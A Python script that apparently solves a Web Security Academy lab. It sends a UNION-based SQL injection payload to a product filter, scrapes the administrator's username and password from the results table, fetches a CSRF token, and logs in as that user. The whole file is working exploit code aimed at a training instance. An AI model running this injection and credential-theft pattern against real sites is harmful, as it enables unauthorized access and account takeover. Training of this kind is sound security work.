import requests
import json
import urllib
from bs4 import BeautifulSoup

# Challenge 3: The database contains a different table called users, with columns called username 
# and password.
# To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, 
# and use the information to log in as the administrator user.
#
# Comments:
# This is a good 'lesson' because to automate this exploitation, we need to 
# 1. exploit the union command with a select statement to retrieve administrator password
# 2. scrap the password field using lib like BeautifulSoup 
# 3. before making post request to login with user, get csrf token (this was observed when first 
# capturing the login request using burp) remember to use the same session cookie 
# 4. post password to login - once login you will see 'Log out' present in the response as indicator
# that it was successful
#

#modify here ---------
baseURL = "https://0a9e006904f4af04c04448d1007300ae.web-security-academy.net"
cookies = {'session':'JilOMVkb4OuKzqxTfnJrUqAS43CxuvqY'}
#modify end ----------

exploitURL = baseURL + "/filter?category="
loginURL = baseURL + "/login"
username = ""
password = "" 
csrf_token = ""

print("3 Retrieve data from users table")

payload = "' union select username, password from users--"

html_content = requests.get(exploitURL+payload).text

soup = BeautifulSoup(html_content,"html.parser")


table = soup.find('table', class_='is-table-longdescription')
print("Searching for 'administrator' ...")
for row in table.tbody.find_all('tr'):
		headers = str(row.find_all('th'))
		if 'administrator' in headers:
			print("[+] Found password!")
			username = row.find('th').text.strip()
			password = row.find('td').text.strip()

print("		[+] username: {}".format(username))
print("		[+] password: {}".format(password))

#https://0aea00b004101da9c0db297000910086.web-security-academy.net/login
   # <section>
   #      <form class=login-form method=POST action=/login>
   #          <input required type="hidden" name="csrf" value="..................">
   #          <label>Username</label>

print("\nAttempt to login with credentials...")
print("finding csrf token... ")
html_content = requests.get(url = loginURL, cookies=cookies).text
soup = BeautifulSoup(html_content, "html.parser")
csrf_token = soup.find('input', {'name':'csrf'})['value']
print("		[+] csrf token found! : {}".format(csrf_token))

print("\nLoggin in... ")

# data body
# csrf=7XVCXSjAhQbU9Osbin89zpr0tCQUQVXn&username=test&password=pw
data = "csrf={}&username={}&password={}".format(csrf_token,username,password)

res = requests.post(url = loginURL, data = data, cookies=cookies)

#if login is successful you will see 'Log out' 
if "Log out" in res.text:
	print("[+] Successfully logged in!")